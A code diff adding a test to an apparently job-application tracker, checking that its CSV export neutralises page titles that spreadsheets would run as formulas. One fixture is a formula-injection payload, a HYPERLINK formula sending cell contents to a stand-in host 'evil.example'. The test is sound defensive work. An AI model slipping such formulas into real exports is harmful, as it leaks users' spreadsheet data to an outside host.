@@ -98,6 +98,38 @@ test('the CSV quotes what needs quoting and opens in Excel as UTF-8', async () =
   assert.match(csv, /"Remplie"/);
 });
 
+test('a page title a spreadsheet would run as a formula is exported as text', async () => {
+  for (const [i, title] of [
+    '=HYPERLINK("https://evil.example/?"&B2,"Voir")',
+    '+1+1',
+    '-2+3',
+    '@SUM(A1)',
+  ].entries())
+    await apps.recordApplication({
+      url: `https://jobs.example.org/x/${i}`,
+      title,
+      fromAdvert: true,
+      fields: 1,
+    });
+  await apps.recordApplication({
+    url: 'https://jobs.example.org/y',
+    title: 'Data - BI',
+    fromAdvert: true,
+    fields: 1,
+  });
+  const csv = apps.applicationsCsv(await apps.listApplications(), {
+    columns: ['Poste'],
+    status: {},
+  });
+  const cells = csv
+    .split('\n')
+    .slice(1, -1)
+    .map((row) => row.slice(1, row.indexOf('",')));
+  for (const cell of cells) assert.doesNotMatch(cell, /^[=+\-@]/, cell);
+  assert.ok(cells.includes(`'=HYPERLINK(""https://evil.example/?""&B2,""Voir"")`));
+  assert.ok(cells.includes('Data - BI'), 'a title with a dash inside is left as it is');
+});
+
 test('an application added by hand needs a title, and gets a key of its own without an address', async () => {
   assert.equal(await apps.addApplication({ title: '   ' }), null);
   const a = await apps.addApplication({ title: 'Data analyst', company: 'Acme', status: 'interview' });
